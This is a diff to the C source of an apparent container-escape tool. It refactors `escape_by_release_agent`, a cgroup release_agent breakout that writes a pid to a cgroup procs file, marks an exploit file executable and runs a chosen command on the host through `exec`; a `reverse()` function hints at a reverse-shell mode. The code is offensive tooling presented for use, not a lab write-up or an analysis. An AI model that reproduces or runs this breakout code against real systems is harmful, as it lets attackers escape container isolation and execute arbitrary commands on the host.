@@ -16,6 +16,7 @@
 #include "../util/random_str.h"
 #include "../util/utils.h"
 #include "../util/output.h"
+#include "../util/custom_struts.h"
 
 #define STACK_SIZE (1024 * 1024)
 
@@ -35,7 +36,8 @@ int clear_cgroup_procs(void *args) {
 
     sprintf(pid, "%d", getpid());
 
-    printf("[INFO] Echo pid: %s to %s and this pid of process will close soon\n", pid, cgroup_procs_args->cgroup_procs_path);
+    printf("[INFO] Echo pid: %s to %s and this pid of process will close soon\n", pid,
+           cgroup_procs_args->cgroup_procs_path);
 
     fd = open(cgroup_procs_args->cgroup_procs_path, O_WRONLY);
     write(fd, pid, strlen(pid));
@@ -108,7 +110,7 @@ void reverse() {
 }
 
 
-int escape_by_release_agent(char *container_path_in_host, char *cmd) {
+int escape_by_release_agent(char *container_path_in_host) {
     printf("[INFO] Start escape by release_agent\n");
     const int cgroup_path_random_length = 10;
     const int controller_path_random_length = 5;
@@ -182,6 +184,7 @@ int escape_by_release_agent(char *container_path_in_host, char *cmd) {
     // rwx--x--x
     int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
     chmod(exp_path, exp_mode);
-
-    exec(exp_path, cmd, container_path_in_host, controller_path, mount_path);
+    if (attack_info.attack_mode == EXEC) {
+        exec(exp_path, attack_info.command, container_path_in_host, controller_path, mount_path);
+    }
 }
